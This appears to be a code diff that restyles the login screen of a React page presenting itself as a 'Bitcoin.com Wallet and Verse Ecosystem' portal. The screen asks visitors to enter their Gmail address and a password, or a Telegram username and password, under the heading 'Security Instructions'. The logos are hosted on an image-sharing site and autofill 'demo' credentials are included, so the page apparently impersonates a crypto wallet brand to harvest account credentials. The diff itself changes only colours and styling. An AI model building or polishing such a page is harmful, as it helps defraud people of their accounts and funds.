@@ -659,11 +659,11 @@ export default function App() {
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 z-[9999] bg-gradient-to-br from-[#020924] via-[#051139] to-[#0a1e5c] flex flex-col items-center justify-start sm:justify-center p-6 py-12 overflow-y-auto"
+            className="fixed inset-0 z-[9999] bg-gradient-to-br from-[#fcfbfa] via-amber-50/45 to-[#fdfcfb] flex flex-col items-center justify-start sm:justify-center p-6 py-12 overflow-y-auto"
           >
-            {/* Elegant glowing background ambient lights */}
-            <div className="absolute top-1/4 left-1/4 w-[300px] h-[300px] bg-blue-500/10 rounded-full blur-[110px] pointer-events-none animate-pulse" />
-            <div className="absolute bottom-1/4 right-1/4 w-[300px] h-[300px] bg-indigo-500/10 rounded-full blur-[110px] pointer-events-none animate-pulse" style={{ animationDuration: '6s' }} />
+            {/* Elegant glowing background ambient lights in warm amber/gold colors */}
+            <div className="absolute top-1/4 left-1/4 w-[350px] h-[350px] bg-amber-400/10 rounded-full blur-[120px] pointer-events-none animate-pulse" />
+            <div className="absolute bottom-1/4 right-1/4 w-[350px] h-[350px] bg-[#c0a080]/15 rounded-full blur-[120px] pointer-events-none animate-pulse" style={{ animationDuration: '6s' }} />
 
             <AnimatePresence mode="wait">
               {isConnectingApp ? (
@@ -676,7 +676,7 @@ export default function App() {
                 >
                   {/* BRAND LOGOS AT LOADING SCREEN TOO */}
                   <div className="flex justify-center items-center gap-4 mb-2">
-                    <div className="w-16 h-16 rounded-[1.4rem] overflow-hidden shadow-[0_8px_30px_rgb(0,0,0,0.3)] border border-blue-900/40 p-1 bg-white transition-all hover:scale-105 duration-300">
+                    <div className="w-16 h-16 rounded-[1.4rem] overflow-hidden shadow-[0_10px_30px_rgba(139,94,60,0.15)] border border-[#8b5e3c]/20 p-1 bg-white transition-all hover:scale-105 duration-300">
                       <img
                         src="https://i.ibb.co.com/bRMwqvJz/IMG-20260530-154814.jpg"
                         alt="Bitcoin.com Wallet Logo"
@@ -684,7 +684,7 @@ export default function App() {
                         referrerPolicy="no-referrer"
                       />
                     </div>
-                    <div className="w-16 h-16 rounded-[1.4rem] overflow-hidden shadow-[0_8px_30px_rgb(0,0,0,0.3)] border border-blue-900/40 p-1 bg-white transition-all hover:scale-105 duration-300">
+                    <div className="w-16 h-16 rounded-[1.4rem] overflow-hidden shadow-[0_10px_30px_rgba(139,94,60,0.15)] border border-[#8b5e3c]/20 p-1 bg-white transition-all hover:scale-105 duration-300">
                       <img
                         src="https://i.ibb.co.com/gbFvzHdb/file-00000000fdd071fa8b2edad69edccb1f.png"
                         alt="Verse Ecosystem Logo"
@@ -695,31 +695,31 @@ export default function App() {
                   </div>
 
                   <div className="text-center">
-                    <h1 className="text-2xl font-extrabold text-white tracking-tight">
-                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-sky-300">Wallet</span>
+                    <h1 className="text-2xl font-extrabold text-slate-900 tracking-tight">
+                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-indigo-600">Wallet</span>
                     </h1>
                     <p className="text-[9px] font-mono tracking-[0.25em] text-[#c0a080] font-black uppercase mt-0.5">AND VERSE ECOSYSTEM & ANALYTICS PORTAL</p>
                   </div>
 
                   <div className="relative w-20 h-20 mx-auto mt-2">
-                    <div className="absolute inset-[-10px] bg-blue-500/5 rounded-full blur-sm animate-pulse"></div>
-                    <div className="absolute inset-0 border-4 border-blue-950 rounded-full"></div>
-                    <div className="absolute inset-0 border-4 border-t-blue-400 border-r-indigo-400 border-l-sky-400 rounded-full animate-spin" style={{ animationDuration: '0.8s' }}></div>
+                    <div className="absolute inset-[-10px] bg-amber-500/5 rounded-full blur-sm animate-pulse"></div>
+                    <div className="absolute inset-0 border-4 border-[#8b5e3c]/10 rounded-full"></div>
+                    <div className="absolute inset-0 border-4 border-t-[#8b5e3c] border-r-amber-500 border-l-[#c0a080] rounded-full animate-spin" style={{ animationDuration: '0.8s' }}></div>
                   </div>
-                  <h2 className="text-xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-indigo-300 to-sky-300 uppercase tracking-widest animate-pulse">
+                  <h2 className="text-xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#8b5e3c] via-[#bd9471] to-[#603f25] uppercase tracking-widest animate-pulse">
                     Connecting Portal...
                   </h2>
-                  <p className="text-xs text-slate-300 font-bold font-mono tracking-wider">Please wait while your secure session is starting</p>
+                  <p className="text-xs text-slate-600 font-bold font-mono tracking-wider">Please wait while your secure session is starting</p>
                   
                   {/* Dynamic Progress indicator */}
                   <div className="w-[240px] mx-auto space-y-2 pt-2">
-                    <div className="h-2 bg-slate-950 rounded-full overflow-hidden">
+                    <div className="h-2 bg-[#8b5e3c]/10 rounded-full overflow-hidden">
                       <div 
-                        className="h-full bg-gradient-to-r from-blue-500 to-indigo-500 transition-all duration-150 ease-out"
+                        className="h-full bg-gradient-to-r from-[#8b5e3c] to-[#c0a080] transition-all duration-150 ease-out"
                         style={{ width: `${connectProgress}%` }}
                       />
                     </div>
-                    <div className="flex justify-between items-center text-[10px] text-slate-400 font-mono font-bold">
+                    <div className="flex justify-between items-center text-[10px] text-[#8b5e3c] font-mono font-bold">
                       <span>SECURE SYNCING</span>
                       <span>{Math.floor(connectProgress)}%</span>
                     </div>
@@ -735,7 +735,7 @@ export default function App() {
                     className="text-center w-full px-4"
                   >
                     <div className="flex justify-center items-center gap-4 mb-4">
-                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-[0_12px_36px_rgba(0,0,0,0.35)] border border-blue-900/40 p-1 bg-white transition-all hover:scale-110 duration-300">
+                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-[0_12px_36px_rgba(139,94,60,0.12)] border border-[#8b5e3c]/20 p-1 bg-white transition-all hover:scale-110 duration-300">
                         <img
                           src="https://i.ibb.co.com/bRMwqvJz/IMG-20260530-154814.jpg"
                           alt="Bitcoin.com Wallet Logo"
@@ -743,7 +743,7 @@ export default function App() {
                           referrerPolicy="no-referrer"
                         />
                       </div>
-                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-[0_12px_36px_rgba(0,0,0,0.35)] border border-blue-900/40 p-1 bg-white transition-all hover:scale-110 duration-300">
+                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-[0_12px_36px_rgba(139,94,60,0.12)] border border-[#8b5e3c]/20 p-1 bg-white transition-all hover:scale-110 duration-300">
                         <img
                           src="https://i.ibb.co.com/gbFvzHdb/file-00000000fdd071fa8b2edad69edccb1f.png"
                           alt="Verse Ecosystem Logo"
@@ -752,22 +752,22 @@ export default function App() {
                         />
                       </div>
                     </div>
-                    <h1 className="text-3xl font-extrabold text-white tracking-tight">
-                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-sky-300">Wallet</span>
+                    <h1 className="text-3xl font-extrabold text-slate-900 tracking-tight">
+                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-indigo-600">Wallet</span>
                     </h1>
                     <p className="text-[11px] font-mono tracking-[0.2em] text-[#c0a080] font-black uppercase mt-1">AND VERSE ECOSYSTEM & ANALYTICS PORTAL</p>
                   </motion.div>
 
                   {/* SIGN IN INSTRUCTIONS DESCRIPTION CARD */}
-                  <div className="bg-[#0b1436]/80 border border-blue-550/20 rounded-[2rem] p-5 text-left text-slate-350 text-xs leading-relaxed space-y-3 w-full shadow-lg backdrop-blur-md">
-                    <div className="flex items-center gap-2 text-sky-450 font-extrabold uppercase tracking-wider text-[11px]">
-                      <Info className="w-4 h-4 text-sky-400" />
+                  <div className="bg-gradient-to-br from-[#fdfbf7] to-white border border-[#8b5e3c]/20 rounded-[2rem] p-5 text-left text-slate-700 text-xs leading-relaxed space-y-3 w-full shadow-xl">
+                    <div className="flex items-center gap-2 text-[#8b5e3c] font-extrabold uppercase tracking-wider text-[11px]">
+                      <Info className="w-4 h-4 text-[#bd9471]" />
                       <span>Security Instructions</span>
                     </div>
-                    <p className="text-slate-300 font-medium font-sans">
+                    <p className="text-slate-800 font-medium font-sans">
                       Welcome. To access the website, please use your Gmail account and create a password for security purposes. Alternatively, you can log in using your Telegram username and a secure password. Thank you.
                     </p>
-                    <p className="text-slate-400 font-normal font-sans text-[11px] mt-1.5 pt-1.5 border-t border-blue-950/40 leading-relaxed">
+                    <p className="text-slate-500 font-normal font-sans text-[11px] mt-1.5 pt-1.5 border-t border-[#8b5e3c]/10 leading-relaxed">
                       For your convenience, you may click on the &#39;Autofill Demo Account&#39; option. It will automatically take you to the demo account, allowing you to easily access the website.
                     </p>
                   </div>
@@ -776,10 +776,10 @@ export default function App() {
                   <motion.div 
                     initial={{ opacity: 0, y: 20 }}
                     animate={{ opacity: 1, y: 0 }}
-                    className="w-full bg-[#080e2b]/95 border border-blue-900/60 rounded-[2.2rem] p-6 shadow-2xl flex flex-col gap-5 border-t-2 border-t-blue-500/20 backdrop-blur-md"
+                    className="w-full bg-white border border-[#8b5e3c]/20 rounded-[2.2rem] p-6 shadow-2xl flex flex-col gap-5 border-t-4 border-t-[#8b5e3c]/60"
                   >
                     <div>
-                      <span className="text-[9px] font-mono tracking-widest text-[#5698ff] font-black uppercase bg-blue-500/10 px-2.5 py-1 rounded-full border border-blue-500/20">
+                      <span className="text-[9px] font-mono tracking-widest text-[#8b5e3c] font-black uppercase bg-amber-500/10 px-2.5 py-1 rounded-full border border-amber-500/20">
                         {loginMethod === 'google' ? 'GOOGLE EMAIL SESSION' : 'TELEGRAM SECURE CORES'}
                       </span>
                     </div>
@@ -788,24 +788,24 @@ export default function App() {
                       {loginMethod === 'google' ? (
                         <>
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-300 font-extrabold mb-1.5 px-0.5">Google Gmail Account</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-[#8b5e3c] font-extrabold mb-1.5 px-0.5">Google Gmail Account</label>
                             <input
                               type="email"
                               value={customGoogleEmailApp}
                               onChange={(e) => setCustomGoogleEmailApp(e.target.value)}
                               placeholder="...........@gmail.com"
-                              className="w-full bg-[#030718] border border-blue-900/60 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 outline-none rounded-xl px-4 py-3 text-xs text-slate-200 font-semibold transition-all font-sans"
+                              className="w-full bg-slate-50/70 border border-[#8b5e3c]/20 focus:border-[#8b5e3c] focus:ring-1 focus:ring-[#8b5e3c] outline-none rounded-xl px-4 py-3 text-xs text-slate-800 font-semibold transition-all font-sans"
                             />
                           </div>
 
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-300 font-extrabold mb-1.5 px-0.5">Access Password</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-[#8b5e3c] font-extrabold mb-1.5 px-0.5">Access Password</label>
                             <input
                               type="password"
                               value={telegramPass}
                               onChange={(e) => setTelegramPass(e.target.value)}
                               placeholder="••••••••"
-                              className="w-full bg-[#030718] border border-blue-900/60 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 outline-none rounded-xl px-4 py-3 text-xs text-slate-200 font-semibold transition-all"
+                              className="w-full bg-slate-50/70 border border-[#8b5e3c]/20 focus:border-[#8b5e3c] focus:ring-1 focus:ring-[#8b5e3c] outline-none rounded-xl px-4 py-3 text-xs text-slate-800 font-semibold transition-all"
                             />
                           </div>
 
@@ -816,7 +816,7 @@ export default function App() {
                                 setCustomGoogleEmailApp('...........@gmail.com');
                                 setTelegramPass('supersecret');
                               }}
-                              className="inline-flex items-center gap-1.5 text-[10.5px] text-blue-450 hover:text-blue-350 transition-colors font-mono font-black hover:underline bg-blue-500/5 hover:bg-blue-500/10 px-3 py-1.5 rounded-xl border border-blue-500/15 cursor-pointer"
+                              className="inline-flex items-center gap-1.5 text-[10.5px] text-[#8b5e3c] hover:text-[#a67148] transition-colors font-mono font-black hover:underline bg-amber-500/5 hover:bg-amber-500/10 px-3 py-1.5 rounded-xl border border-[#8b5e3c]/15 cursor-pointer"
                             >
                               💡 Autofill Demo Account
                             </button>
@@ -825,7 +825,7 @@ export default function App() {
                       ) : (
                         <>
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-300 font-extrabold mb-1.5 px-0.5">Telegram Username</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-[#8b5e3c] font-extrabold mb-1.5 px-0.5">Telegram Username</label>
                             <div className="relative">
                               <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-black font-mono text-xs">@</span>
                               <input
@@ -833,19 +833,19 @@ export default function App() {
                                 value={telegramUser}
                                 onChange={(e) => setTelegramUser(e.target.value)}
                                 placeholder="username"
-                                className="w-full bg-[#030718] border border-blue-900/60 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 outline-none rounded-xl pl-8 pr-4 py-3 text-xs text-slate-200 font-semibold transition-all"
+                                className="w-full bg-slate-50/70 border border-[#8b5e3c]/20 focus:border-[#8b5e3c] focus:ring-1 focus:ring-[#8b5e3c] outline-none rounded-xl pl-8 pr-4 py-3 text-xs text-slate-800 font-semibold transition-all"
                               />
                             </div>
                           </div>
 
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-300 font-extrabold mb-1.5 px-0.5">Access Password</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-[#8b5e3c] font-extrabold mb-1.5 px-0.5">Access Password</label>
                             <input
                               type="password"
                               value={telegramPass}
                               onChange={(e) => setTelegramPass(e.target.value)}
                               placeholder="••••••••"
-                              className="w-full bg-[#030718] border border-blue-900/60 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 outline-none rounded-xl px-4 py-3 text-xs text-slate-200 font-semibold transition-all"
+                              className="w-full bg-slate-50/70 border border-[#8b5e3c]/20 focus:border-[#8b5e3c] focus:ring-1 focus:ring-[#8b5e3c] outline-none rounded-xl px-4 py-3 text-xs text-slate-800 font-semibold transition-all"
                             />
                           </div>
 
@@ -856,7 +856,7 @@ export default function App() {
                                 setTelegramUser('juwel_rana_official');
                                 setTelegramPass('secretpass123');
                               }}
-                              className="inline-flex items-center gap-1.5 text-[10.5px] text-blue-450 hover:text-blue-350 transition-colors font-mono font-black hover:underline bg-blue-500/5 hover:bg-blue-500/10 px-3 py-1.5 rounded-xl border border-blue-500/15 cursor-pointer"
+                              className="inline-flex items-center gap-1.5 text-[10.5px] text-[#8b5e3c] hover:text-[#a67148] transition-colors font-mono font-black hover:underline bg-amber-500/5 hover:bg-amber-500/10 px-3 py-1.5 rounded-xl border border-[#8b5e3c]/15 cursor-pointer"
                             >
                               💡 Autofill Demo Account
                             </button>
@@ -865,13 +865,13 @@ export default function App() {
                       )}
 
                       {/* Unified Trigger Button below Autofill to hop styles */}
-                      <div className="pt-3 border-t border-blue-950/40 mt-1">
+                      <div className="pt-3 border-t border-slate-100/80 mt-1">
                         <button
                           type="button"
                           onClick={() => {
                             setLoginMethod(loginMethod === 'google' ? 'telegram' : 'google');
                           }}
-                          className="w-full text-center py-2.5 rounded-xl text-xs font-semibold uppercase tracking-wider transition-all bg-[#0a1130] hover:bg-[#0f1947] border border-blue-900/50 text-slate-300 flex items-center justify-center gap-2 cursor-pointer shadow-sm font-sans"
+                          className="w-full text-center py-2.5 rounded-xl text-xs font-semibold uppercase tracking-wider transition-all bg-white hover:bg-slate-50 border border-slate-200 text-slate-700 flex items-center justify-center gap-2 cursor-pointer shadow-sm font-sans"
                         >
                           {loginMethod === 'google' ? 'Login To Telegram' : 'Login To Gmail'}
                         </button>
@@ -888,7 +888,7 @@ export default function App() {
                           // Map the user session securely
                           const finalEmail = (emailInput === '...........@gmail.com' || emailInput === '')
                             ? 'mdjuwelranajx127133@gmail.com'
-                            : emailInput;
+                             : emailInput;
                             
                           setIsConnectingApp(true);
                           setConnectProgress(0);
@@ -933,7 +933,7 @@ export default function App() {
                         }
                       }}
                       disabled={loginMethod === 'google' ? !customGoogleEmailApp.trim() : !telegramUser.trim()}
-                      className="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-sky-600 hover:from-blue-500 hover:to-sky-500 disabled:opacity-45 text-white font-extrabold py-3.5 px-4 rounded-xl flex items-center justify-center gap-2 text-xs tracking-wider uppercase transition-all shadow-lg shadow-blue-500/20 cursor-pointer mt-2 border-t border-white/10"
+                      className="w-full bg-gradient-to-r from-[#8b5e3c] via-[#bd9471] to-[#603f25] hover:opacity-95 disabled:opacity-45 text-white font-extrabold py-3.5 px-4 rounded-xl flex items-center justify-center gap-2 text-xs tracking-wider uppercase transition-all shadow-lg shadow-amber-700/20 cursor-pointer mt-2 border-t border-white/10"
                     >
                       {loginMethod === 'google' ? (
                         <>
